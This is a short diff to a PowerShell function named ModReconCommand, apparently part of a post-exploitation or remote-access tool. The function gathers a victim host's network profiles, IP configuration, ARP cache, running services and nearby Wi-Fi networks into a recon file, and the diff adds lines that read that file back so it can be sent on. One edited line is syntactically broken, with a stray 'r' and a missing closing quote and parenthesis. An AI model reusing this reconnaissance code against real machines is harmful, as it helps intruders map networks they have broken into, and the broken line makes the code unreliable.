@@ -40,9 +40,9 @@ Function ModReconCommand {
 			echo "30%"
 			$output = $output + "`n`n ========================= NETWORK ===============================`r`n"
 			$output = $output + "`n`n ======= Network Profiles:`n" + ((Get-NetConnectionProfile)  -join "`r`n")
-			$output = $output + "`n`n ======= Network config:`n" + ((ipconfig -all)  -join "`r`n")
+			$output = $output + "`n`n ======= Network config:`n" + ((ipconfig -all)  -join "`r`nr
 			$output = $output + "`n`n ======= ARP Cache:`n" + ((arp -a)  -join "`r`n")
-			#$output = $output + "`n`n ======== Open connections:`n" + ((netstat -b -o 5)  -join "`r`n")
+			#$output = $output + "`n`n ======== Open connections:`n" + ((netstat)  -join "`r`n")
 			$output = $output + "`n`n ======== Running Services:`n" + ((net start) -join "`r`n")
 			$output = $output + "`n`n ======== WLAN Info:`n" + ((netsh wlan show net mode=bssid)  -join "`r`n") 
 			echo "50%"
@@ -68,4 +68,6 @@ Function ModReconCommand {
 			echo "100%"
 			
 			set-content $reconfile -Value $output
+			$resultosend = [IO.File]::ReadAllText($reconfile)
+			$resultosend
 			}
